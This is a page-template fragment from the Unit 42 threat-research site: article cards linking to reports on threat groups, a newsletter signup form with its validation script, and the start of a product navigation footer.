					<a href="https://unit42.paloaltonetworks.com/tag/north-korea/" title="North Korea" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors:North Korea">North Korea</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/gleaming-pisces-applejeus-poolrat-and-pondrat/" title="Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1-786x368.png" class="attachment-medium size-medium" alt="Illustrative image featuring two fish and the Pisces constellation superimposed on a stylized, abstract background with flowing purple waves and a starry night sky." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1-786x368.png 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1-1493x700.png 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1-768x360.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1-1536x720.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/Pisces-NK-A-1920x900-1.png 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/top-cyberthreats/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Threat Assessment: North Korean Threat Groups:High Profile Threats"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/top-threats.svg" alt=" category icon">High Profile Threats</span></a>                  <a href="https://unit42.paloaltonetworks.com/threat-assessment-north-korean-threat-groups-2024/" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Threat Assessment: North Korean Threat Groups">
                    <h4 class="post-title">Threat Assessment: North Korean Threat Groups</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/north-korea/" title="North Korea" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Threat Assessment: North Korean Threat Groups:North Korea">North Korea</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/remote-access-trojan/" title="Remote Access Trojan" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Threat Assessment: North Korean Threat Groups:Remote Access Trojan">Remote Access Trojan</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/finance/" title="Finance" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Threat Assessment: North Korean Threat Groups:Finance">Finance</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/threat-assessment-north-korean-threat-groups-2024/" title="Threat Assessment: North Korean Threat Groups" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Threat Assessment: North Korean Threat Groups:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1-786x368.png" class="attachment-medium size-medium" alt="Pictorial representation of Stately Taurus&#039; updated TTPs. Illustration of a bull&#039;s head and the Taurus constellation inside a stylized orange moon, set against the profile of a much larger bull&#039;s head. Shooting stars are on the dark background." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1-786x368.png 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1-1493x700.png 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1-768x360.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1-1536x720.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/09-3-Stately-Taurus-1920x900-1.png 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Chinese APT Abuses VSCode to Target Government in Asia:Threat Actor Groups"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/threat-actor-groups.svg" alt=" category icon">Threat Actor Groups</span></a>                  <a href="https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Chinese APT Abuses VSCode to Target Government in Asia">
                    <h4 class="post-title">Chinese APT Abuses VSCode to Target Government in Asia</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/dll-sideloading/" title="DLL Sideloading" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Chinese APT Abuses VSCode to Target Government in Asia:DLL Sideloading">DLL Sideloading</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/advanced-persistent-threat/" title="Advanced Persistent Threat" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Chinese APT Abuses VSCode to Target Government in Asia:Advanced Persistent Threat">Advanced Persistent Threat</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/china/" title="China" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Chinese APT Abuses VSCode to Target Government in Asia:China">China</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/" title="Chinese APT Abuses VSCode to Target Government in Asia" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Chinese APT Abuses VSCode to Target Government in Asia:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900-786x368.jpg" class="attachment-medium size-medium" alt="Pictorial representation of malware such as WikiLoader. Red and blue digital data flowing from microchips on a circuit board, representing high-tech computing." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/04_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant:Threat Research"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                  <a href="https://unit42.paloaltonetworks.com/global-protect-vpn-spoof-distributes-wikiloader/" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant">
                    <h4 class="post-title">Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/malvertising/" title="malvertising" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant:malvertising">Malvertising</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/dll-sideloading/" title="DLL Sideloading" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant:DLL Sideloading">DLL Sideloading</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/global-protect-vpn-spoof-distributes-wikiloader/" title="Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Spoofed GlobalProtect Used to Deliver Unique WikiLoader Variant:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1-786x368.png" class="attachment-medium size-medium" alt="Pictorial representation of APT Fighting Ursa. The silhouette of a bear and the Ursa constellation inside an orange abstract planet. Abstract, stylized cosmic setting with vibrant blue and purple claw marks, representing space and distant planetary bodies." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1-786x368.png 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1-1493x700.png 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1-768x360.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1-1536x720.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/08/Fighting-URSA-1920x900-1.png 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Fighting Ursa Luring Targets With Car for Sale:Threat Actor Groups"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/threat-actor-groups.svg" alt=" category icon">Threat Actor Groups</span></a>                  <a href="https://unit42.paloaltonetworks.com/fighting-ursa-car-for-sale-phishing-lure/" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Fighting Ursa Luring Targets With Car for Sale">
                    <h4 class="post-title">Fighting Ursa Luring Targets With Car for Sale</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/advanced-persistent-threat/" title="Advanced Persistent Threat" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Fighting Ursa Luring Targets With Car for Sale:Advanced Persistent Threat">Advanced Persistent Threat</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/apt28/" title="APT28" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Fighting Ursa Luring Targets With Car for Sale:APT28">APT28</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/fancy-bear/" title="Fancy Bear" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Fighting Ursa Luring Targets With Car for Sale:Fancy Bear">Fancy Bear</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/fighting-ursa-car-for-sale-phishing-lure/" title="Fighting Ursa Luring Targets With Car for Sale" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Fighting Ursa Luring Targets With Car for Sale:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                    </div>
    </div>
    <div class="l-container bs__controls">
      <div class="bs__progress"><span></span></div>
      <div class="bs__navigation"> 
        <ul>
          <li> 
            <button id="prevButton"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg" alt="Slider arrow"></button>
          </li>
          <li> 
            <button id="nextButton"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg" alt="Slider arrow"></button>
          </li>
        </ul>
      </div>
    </div>
  </div>
 
        <div class="be-enlarge-modal" id="enlargedModal">
          <div class="be-enlarge-modal__wrapper"> 
            <figure> 
              <button class="close__modal" id="closeModal"> 
              <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg" alt="Close button"></button>
              <img class="be__enlarged-image" id="enlargedImage" src="" alt="Enlarged Image">
              <figcaption> </figcaption>
            </figure>
          </div>
        </div>

      </div>
    </section>
  </main>
<!--  Start: Footer subscription form -->
<div class="newsletter">
      <div class="l-container">
        <div class="newsletter__wrapper">
          <div class="image__wrapper"> 
            <picture>
			              	 <source media="(max-width:400px)" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/newsletter-Image-mobile.webp">
			  			               	 <source media="(max-width:949px)" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/newsletter-Image-tab.webp">
			  			  			  	<img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/Revitalized_newsletter-Image-desktop-copy-1.webp" alt="Newsletter">
			              </picture>
          </div>
          <div class="content__wrapper"> 
		    							<span class="pre-title"> 
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/palo-alto-logo-small.svg" alt="UNIT 42 Small Logo">
				Get updates from Unit 42			</span>
						           	 <h2>Peace of mind comes from staying ahead of threats. Contact us today.</h2>
			            <form action="https://www.paloaltonetworks.com/apps/pan/public/formsubmithandler.submitform.json" method="post" novalidate class="subscribe-form" name="Unit42_Subscribe" id="unit42footerSubscription_form">
              <input type="hidden" name="emailFormMask" value="">
              <input type="hidden" value="1086" name="formid">
              <input type="hidden" value="531-OCS-018" name="munchkinId">
              <input type="hidden" value="2141" name="lpId">
              <input type="hidden" value="1203" name="programId">
              <input type="hidden" value="1086" name="formVid">
              <input type="hidden" name="mkto_optinunit42" value="true">
              <input type="hidden" name="mkto_opt-in" value="true">
              <div class="form-group"> 
                <label for="newsletter-email"  id="newsletter-email-label">Your Email</label>
                <input type="emal" placeholder="Your Email" name="Email"  class="subscribe-field" id="newsletter-email" aria-labelledby="newsletter-email-label">
                <p class="error-mail mb-15 text-danger" style="color: #dc3545"></p>
				<p>Subscribe for email updates to all Unit 42 threat research.<br />By submitting this form, you agree to our <a title="Terms of Use" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use" data-page-track="true" data-page-track-value="Get updates from Unit 42:Terms of Use">Terms of Use</a> and acknowledge our <a title="Privacy Statement" href="https://www.paloaltonetworks.com/legal-notices/privacy" data-page-track="true" data-page-track-value="Get updates from Unit 42:Privacy Statement">Privacy Statement.</a></p>
                <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6Lc5EhgTAAAAAJa-DzE7EeWABasWg4LKv-R3ao6o"></div>
                <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Invalid captcha!</p>
                <button class="l-btn is-disabled" data-page-track="true" data-page-track-value="footer:Get updates from Unit 42:Subscribe" id="unit42footerSubscription_form_button"> 
					Subscribe					<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg" alt="Right Arrow"  class="arrow">
					<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-loader.svg" alt="loader" class="loader">
			   </button>
				<div class="form-success-message"></div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

<script>

(function($) {
	// Migrated from the unit42-v5 + Modifications
	var subscribeSuccess = false;
	var email = document.getElementById('newsletter-email');
	var subscription_form = document.getElementById('unit42footerSubscription_form');
	var subscription_form_button = document.getElementById('unit42footerSubscription_form_button');
	window.captchaComplete = function() {
		subscribeSuccess = true;
		if ($(mail).val() != '' && isEmail($(mail).val())) {
			$(subscription_form_button).removeClass('is-disabled');
		}
		setTimeout(function() {
			$(email).focus();
			$('.g-recaptcha iframe').attr('tabindex', '-1');
		}, 100)
	}
	window.captchaExpires = function() {
		subscribeSuccess = false;
		$(subscription_form_button).addClass('is-disabled', true);
	} 
	$(subscription_form).submit(function(e) {
		e.preventDefault();
		e.stopImmediatePropagation();
		updateEmailMask();
		var success = true;
		var form = $(this);
		var mail = form.find('input[name="Email"]');
		
		if (mail.val() === '') {
			mail.addClass('has-error');
			showError(1);
			success = false;	
		}  else if (!isEmail(mail.val())){
			showError(2);
			success = false;
		}
		else {
			mail.removeClass('has-error');
			$('.error-mail').addClass('d-none');
		}

		if (!subscribeSuccess) {
			$('.error-recaptcha').removeClass('d-none');
		} else {
			$('.error-recaptcha').addClass('d-none');
		}

		if (success && subscribeSuccess) {
			$.ajax({
				type: 'POST',
				url: form.attr('action'),
				data: form.serialize(),
				beforeSend: function() {
                 form.find('button').addClass('is-loading');
    			},
				success: function(msg) {
					form.find('.form-success-message').html('<p class="success-message">You have been successfully subscribed</p>');
					form.find('button').removeClass('is-loading');
					$(email).val('');
					clearError();
				},
				error: function(jqXHR, textStatus, errorThrown) {
					$(subscription_form_button).addClass('is-disabled', true);
					form.find('button').removeClass('is-loading');
					
				}
			});
		}
		return false;
	});
	function showError(error_type){
		if(error_type == 1) {
			$('.error-mail').text("Please enter the email address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		} else if(error_type == 2){
			$('.error-mail').text("Please provide a valid e-mail address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		}	
		$(subscription_form_button).removeClass('is-loading');
	}
	function clearError(){
		$('.error-mail').text("").removeClass('error-show');;
		$(subscription_form_button).removeClass('is-loading');
		$(subscription_form_button).removeClass('is-disabled');
	}
	
	$(email).on('input', function (event) { 
		var email = $(this).val();
		if (isEmail(email) ) {			
			clearError();
		} else if(email == ""){
			clearError();
		} else{
			showError(2);			  
		}
    });

	function isEmail(email) {
		var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		return re.test(String(email).toLowerCase());
	}
	
	var captcha_loaded = false;
         if(!captcha_loaded){
            // recaptcha on foucs call
            $(document).on('change paste keyup', '#newsletter-email', function () {
               if($('.g-recaptcha').hasClass('d-none')){
                $('.g-recaptcha').removeClass('d-none');
               }
               if(!captcha_loaded ){
                  captcha_loaded  = true;
                  // trigger loading api.js (recaptcha.js) script
                  var head = document.getElementsByTagName('head')[0];
                  var script = document.createElement('script');
                  script.type = 'text/javascript';
                  script.src = 'https://www.google.com/recaptcha/api.js?hl=en_US';
                  head.appendChild(script);
               }
            });
        }
	
	function updateEmailMask() {
		var email = $("#unit42footerSubscription_form input[name='Email']").val();
		if (email && email.trim() != '') {
			var maskedEmail = maskEmailAddress(email);
			$("#unit42footerSubscription_form input[name='emailFormMask']").val(maskedEmail);
		}
	}

	function maskEmailAddress (emailAddress) {
		function mask(str) {
			var strLen = str.length;
			if (strLen > 4) {
				return str.substr(0, 1) + str.substr(1, strLen - 1).replace(/\w/g, '*') + str.substr(-1,1);
			}
			return str.replace(/\w/g, '*');
		}
		return emailAddress.replace(/([\w.]+)@([\w.]+)(\.[\w.]+)/g, function (m, p1, p2, p3) {
			return mask(p1) + '@' + mask(p2) + p3;
		});

		return emailAddress;
	}

}(jQuery));
//# sourceMappingURL=main.js.map
	
</script>
<!--  End: Footer subscription form -->

<footer class="footer"> 
  <div class="footer-menu">
    <div class="l-container">
      <div class="footer-menu__wrapper">
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Products and services</h3>
                                <div class="nav-column__wrapper"> 
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security"   role="link" title="Network Security Platform" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform">Network Security Platform</a>
						</li>    
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security/security-subscriptions"   role="link" title="CLOUD DELIVERED SECURITY SERVICES" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES">CLOUD DELIVERED SECURITY SERVICES</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/advanced-threat-prevention" target=_blank  role="link" title="Advanced Threat Prevention" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention">Advanced Threat Prevention</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/advanced-dns-security"   role="link" title="DNS Security" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security">DNS Security</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/enterprise-data-loss-prevention"   role="link" title="Data Loss Prevention" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention">Data Loss Prevention</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/enterprise-iot-security"   role="link" title="IoT Security" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security">IoT Security</a>
						</li>    
					        
					</ul>
				</nav>
																		<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall"   role="link" title="Next-Generation Firewalls" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls">Next-Generation Firewalls</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall-hardware"   role="link" title="Hardware Firewalls" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls">Hardware Firewalls</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/strata-cloud-manager"   role="link" title="Strata Cloud Manager" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager">Strata Cloud Manager</a>
						</li>    
					        
					</ul>
				</nav>
																		<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/sase"   role="link" title="SECURE ACCESS SERVICE EDGE" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE">SECURE ACCESS SERVICE EDGE</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/access"   role="link" title="Prisma Access" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access">Prisma Access</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/sd-wan"   role="link" title="Prisma SD-WAN" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN">Prisma SD-WAN</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/adem"   role="link" title="Autonomous Digital Experience Management" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management">Autonomous Digital Experience Management</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/next-gen-casb"   role="link" title="Cloud Access Security Broker" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management:Cloud Access Security Broker">Cloud Access Security Broker</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/ztna"   role="link" title="Zero Trust Network Access" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management:Cloud Access Security Broker:Zero Trust Network Access">Zero Trust Network Access</a>
						</li>    
					        
					</ul>
				</nav>
						         
            </div>
            <div class="nav-column">
                          													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/prisma/whyprisma"   role="link" title="Code to Cloud Platform" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform">Code to Cloud Platform</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/prisma/cloud"   role="link" title="Prisma Cloud" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform:Prisma Cloud">Prisma Cloud</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
